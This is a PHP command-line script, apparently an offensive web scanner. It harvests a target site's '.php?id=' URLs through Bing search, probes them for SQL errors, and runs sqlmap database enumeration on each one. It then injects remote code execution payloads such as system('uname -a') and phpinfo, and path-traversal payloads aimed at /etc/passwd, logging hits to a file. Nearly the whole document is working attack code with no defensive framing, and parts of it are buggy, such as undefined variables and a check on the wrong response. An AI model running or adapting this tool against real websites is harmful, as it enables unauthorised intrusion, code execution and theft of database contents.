<?php
$site = $argv[1];
    set_time_limit(0);
function getsource($url, $proxy) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    if ($proxy) {
        $proxy = explode(':', autoprox());
        curl_setopt($curl, CURLOPT_PROXY, $proxy[0]);
        curl_setopt($curl, CURLOPT_PROXYPORT, $proxy[1]);
    }
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
 
            $npages = 300;
            $allLinks = array();
            $lll = array();
            while($npage <= $npages) {
                $x = getsource("http://www.bing.com/search?q=site%3A" . $site . "+.php?id%3D&first=" . $npage, $proxy);
                if ($x) {
                    preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
                    foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
                    $npage = $npage + 10;
                    if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
                } else break;
            }
            //print_r($allLinks) ;
            $col=array_filter($allLinks);
            $lol=array_unique($col);
     
            foreach ($lol as $urll){
 
          $a = curl_init();
	curl_setopt($a, CURLOPT_URL, $urll."'a");
	curl_setopt($a,CURLOPT_POST,1);
	curl_setopt($a,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($a, CURLOPT_RETURNTRANSFER, true);
	$kub = curl_exec($a);
	curl_close($a);
          if(preg_match("/SQL syntax/i",$kub) or eregi('You have an error',$kub) or eregi(' in your SQL syntax',$kub)or preg_match('/sql/i',$x)){
           echo "YES $urll \n";
		   		   $izogel = ("sqlmap -u $urll --dbs");
$pid = popen( $izogel,"r");
 
while( !feof( $pid ) )
{
 echo fread($pid, 256);
 flush();
 ob_flush();
 usleep(100000);
}
pclose($pid);
          }else{
           echo "Not $urll \n";
		   		   $izogel = ("sqlmap -u $urll --dbs");
$pid = popen( $izogel,"r");
 
while( !feof( $pid ) )
{
 echo fread($pid, 256);
 flush();
 ob_flush();
 usleep(100000);
}
pclose($pid);
}
			rce($site);
			lfi($site);			
          }						  

function rce($site) {
    $list_rce = array(
	    '%27;system("uname%20-a");%27',
        ';system("uname -a");',
		';print izocin;',
        '185.9.39.185%0auname+-a',
        ';${@print(md5(zigoo0))}',
		';${@print(md5("zigoo0"))}',
		'"]);}phpinfo();/*',
		'%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B',
		';uname;',
		'&&type C:\\boot.ini',
		';phpinfo();',
		')%3B}system(%27uname%20-a%27)%3B%23',
		';phpinfo',
		'phpinfo();'
    );
        if($full == '0') {
        fwrite(STDOUT, "\n-SITE: ");
        $site = trim(fgets(STDIN));
        } else {
            $site = $site;
        }
        
        $request = parse_url($site);
        print "[-] URL : $request[host]\n";
        print "[-] Path: $request[path]\n";
        print "[-] Try connect to host\n";
        $url = "".$request['scheme']."://".$request['host'].$request['path']."";
        if(con_host($url))
        {
            print "[+] Connect to host successful\n";
            print Get_Info($url);
            print "[-] Finding link on the website\n";
            print "[+] Found link : ".count(find_link($url))."\n";
            print "[-] Finding RCE vulnerable...\n";
            if(is_array(find_link($url)))
            foreach(find_link($url) as $link) {
				print "[-] Finding denenen $link...\n";
                $file = explode("/", $request['path']);
                $request['path'] = preg_replace("/".$file[count($file)-1]."/", "", $request['path']);
                if(!preg_match("/$request[host]/", $link)) { $link = "http://$request[host]/$request[path]$link"; }
                foreach($list_rce as $error) {
                    $link = preg_replace("/=(.+)/", "=$error", $link);
                    if(preg_match("/51107ed95250b4099a0f481221d56497|izocin|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot/", con_host($link))) {
                        print "[-]RCE vulnerable : $link\n";
                        $save[] = $link;
                    }
                }
            }
            print "[-] Done\n";
            if(is_array($save)) {
               foreach($save as $link) {
               $save = @file_put_contents('vulnerable.txt', "".$link."\r\n",FILE_APPEND);
               }}
               print "[+] See 'vulnerable.txt' for vulnerable list\n";
    }
  }
function lfi($site) {
    $list_lfi = array(
        '../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '../../../../../../../../../etc/passwd',
        '../etc/passwd%00',
        '../../etc/passwd%00',
        '../../../etc/passwd%00',
        '../../../../etc/passwd%00',
        '../../../../../etc/passwd%00',
        '../../../../../../etc/passwd%00',
        '../../../../../../../etc/passwd%00',
        '../../../../../../../../etc/passwd%00',
        '../../../../../../../../../etc/passwd%00',
    );
        
        $request = parse_url($site);
        print "[-] URL : $request[host]\n";
        print "[-] Path: $request[path]\n";
        print "[-] Try connect to host\n";
        $url = "".$request['scheme']."://".$request['host'].$request['path']."";
        if(con_host($url))
        {
            print "[+] Connect to host successful\n";
            print Get_Info($url);
            print "[-] Finding link on the website\n";
            print "[+] Found link : ".count(find_link($url))."\n";
            print "[-] Finding  LFi vulnerable...\n";
            if(is_array(find_link($url)))
            foreach(find_link($url) as $link) {
			print "[-] Finding denenen $link...\n";				
                $file = explode("/", $request['path']);
                $request['path'] = preg_replace("/".$file[count($file)-1]."/", "", $request['path']);
                if(!preg_match("/$request[host]/", $link)) { $link = "http://$request[host]/$request[path]$link"; }
                foreach($list_lfi as $error) {
                    $link = preg_replace("/=(.+)/", "=$error", $link);
			  if (preg_match("/root:x:/", con_host($link)) and preg_match("/Linux/", con_host($link))) {

                        print "[-]LFI vulnerable : $link\n";
                        $save[] = $link;
                    }
                }
            }
            print "[-] Done\n";
            if(is_array($save)) {
               foreach($save as $link) {
               $save = @file_put_contents('vulnerable.txt', "".$link."\r\n",FILE_APPEND);
               }}
               print "[+] See 'vulnerable.txt' for vulnerable list\n";
    }
  }  
  
function Get_Info($site) {
    if($info = con_host($site)) {
        preg_match("/Content-Type:(.+)/", $info, $type);
        preg_match("/Server:(.+)/", $info, $server);
        print "[-] $type[0]\n";
        print "[-] $server[0]\n";
        $ip = parse_url($site);
        print "[-] IP: ".gethostbyname($ip['host'])."\n";
    }
}

function con_host($host) {
    $ch = curl_init($host);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 200);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_REFERER, "http://google.com");
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9');
    $pg = curl_exec($ch);
    if($pg){
        return $pg;
    } else {
        return false;
    }
}

function find_link($site) {
    if($text = con_host($site)) {
    $find = "/href=[\"']?([^\"']+)?[\"']?/i";
    preg_match_all($find, $text, $links);
    
    foreach($links[1] as $link) {
        $a[] = $link;
    }
    return $a;
 }
}
?>